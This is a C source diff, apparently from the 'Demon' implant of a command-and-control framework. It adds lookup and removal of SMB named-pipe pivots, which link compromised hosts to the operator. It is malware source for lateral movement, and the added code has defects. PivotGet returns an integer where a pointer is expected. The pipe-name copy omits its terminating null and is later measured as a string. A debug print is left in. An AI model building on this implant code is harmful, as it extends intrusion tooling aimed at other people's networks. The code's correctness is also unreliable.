@@ -25,7 +25,6 @@ BOOL PivotAdd( PCHAR NamedPipe, PVOID* Output, PSIZE_T BytesSize )
     {
         if ( ! Instance->Win32.WaitNamedPipeA( NamedPipe, 5000 ) )
         {
-
             return FALSE;
         }
     }
@@ -70,8 +69,10 @@ BOOL PivotAdd( PCHAR NamedPipe, PVOID* Output, PSIZE_T BytesSize )
         Data->Handle      = Handle;
         Data->Next        = NULL;
         Data->DemonID     = PivotParseDemonID( *Output, *BytesSize );
-        Data->Package     = *Output;
-        Data->PackageSize = *BytesSize;
+        Data->PipeName    = Instance->Win32.LocalAlloc( LPTR, StringLengthA( NamedPipe ) );
+        MemCopy( Data->PipeName, NamedPipe, StringLengthA( NamedPipe ) );
+        /*Data->Package     = *Output;
+        Data->PackageSize = *BytesSize;*/
 
         if ( ! Instance->SmbPivots )
         {
@@ -102,11 +103,98 @@ BOOL PivotAdd( PCHAR NamedPipe, PVOID* Output, PSIZE_T BytesSize )
     return TRUE;
 }
 
-// TODO: remove from linked list and close connection
+PPIVOT_DATA PivotGet( DWORD AgentID )
+{
+    PPIVOT_DATA TempList = Instance->SmbPivots;
+    DWORD       Counter  = 0;
+
+    do {
+        if ( TempList )
+        {
+            if ( TempList->DemonID == AgentID )
+                return TempList;
+
+            TempList = TempList->Next;
+        } else
+            break;
+    } while ( TRUE );
+
+    return Counter;
+}
+
 BOOL PivotRemove( DWORD AgentId )
 {
-    BOOL Success = FALSE;
+    PPIVOT_DATA TempList  = Instance->SmbPivots;
+    PPIVOT_DATA PivotData = PivotGet( AgentId );
+    BOOL        Success   = FALSE;
 
+    if ( ( ! TempList ) || ( ! PivotData ) )
+        return FALSE;
+
+    if ( Instance->SmbPivots->DemonID == AgentId )
+    {
+        PPIVOT_DATA TempNext = Instance->SmbPivots->Next;
+
+        if ( Instance->SmbPivots->PipeName )
+        {
+            MemSet( Instance->SmbPivots->PipeName, 0, StringLengthA( Instance->SmbPivots->PipeName ) );
+            Instance->Win32.LocalFree( Instance->SmbPivots->PipeName );
+        }
+
+        if ( Instance->SmbPivots->Handle )
+        {
+            Instance->Win32.DisconnectNamedPipe( Instance->SmbPivots->Handle );
+            Instance->Win32.NtClose( Instance->SmbPivots->Handle );
+        }
+
+        Instance->SmbPivots->PipeName = NULL;
+        Instance->SmbPivots->Handle   = NULL;
+        Instance->SmbPivots->DemonID  = 0;
+
+        MemSet( Instance->SmbPivots, 0, sizeof( PIVOT_DATA ) );
+        Instance->Win32.LocalFree( Instance->SmbPivots );
+
+        Instance->SmbPivots = TempNext;
+
+        return TRUE;
+    }
+
+    do {
+        if ( TempList )
+        {
+            if ( TempList->Next == PivotData )
+            {
+                TempList->Next = PivotData->Next;
+
+                if ( PivotData->PipeName )
+                {
+                    MemSet( PivotData->PipeName, 0, StringLengthA( PivotData->PipeName ) );
+                    Instance->Win32.LocalFree( PivotData->PipeName );
+                }
+
+                if ( PivotData->Handle )
+                {
+                    Instance->Win32.DisconnectNamedPipe( PivotData->Handle );
+                    Instance->Win32.NtClose( PivotData->Handle );
+                }
+
+                PivotData->PipeName = NULL;
+                PivotData->Handle   = NULL;
+                PivotData->DemonID  = 0;
+
+                MemSet( PivotData, 0, sizeof( PIVOT_DATA ) );
+                Instance->Win32.LocalFree( PivotData );
+                PivotData = NULL;
+
+                return TRUE;
+            }
+            else
+                TempList = TempList->Next;
+        } else
+            break;
+    } while ( TRUE );
+
+    PUTS( "4" )
     return Success;
 }
 
@@ -176,8 +264,6 @@ VOID PivotCollectOutput()
 
                     if ( NtGetLastError() == ERROR_BROKEN_PIPE )
                     {
-                        TempList->Handle = NULL;
-
                         // Sends already read data.
                         PackageTransmit( Package, NULL, NULL );
 
